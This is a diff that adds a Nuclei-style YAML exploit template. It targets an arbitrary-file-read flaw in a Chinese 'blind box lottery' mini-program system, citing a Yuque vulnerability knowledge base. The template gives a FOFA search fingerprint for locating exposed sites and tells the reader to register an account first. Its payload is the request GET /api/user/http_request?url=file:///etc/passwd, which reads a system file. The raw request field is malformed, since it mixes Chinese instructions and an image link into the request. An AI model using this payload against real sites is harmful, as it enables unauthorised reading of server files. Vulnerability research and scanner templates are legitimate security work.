@@ -1,0 +1,23 @@
+id: poc-ngu472gn60gazgoy
+info:
+  name: 盲盒抽奖小程序系统http_request存在任意文件读取漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/ngu472gn60gazgoy'
+  tags: lfi,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: ngu472gn60gazgoy
+    fofa: '"vendor/owl.carousel2/assets/owl.carousel.css" && "img/arrow-left.png"'
+http:
+- raw:
+  - '首先去 /index/user/register.html 注册一个账号，默认开放注册的，然后登录即可使用Payload
+
+    ![](https://cdn.nlark.com/yuque/0/2024/png/43110909/1731988470907-13ed2511-547d-460b-8f50-8ea2481d420e.png)
+
+    GET /api/user/http_request?url=file:///etc/passwd HTTP/1.1'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
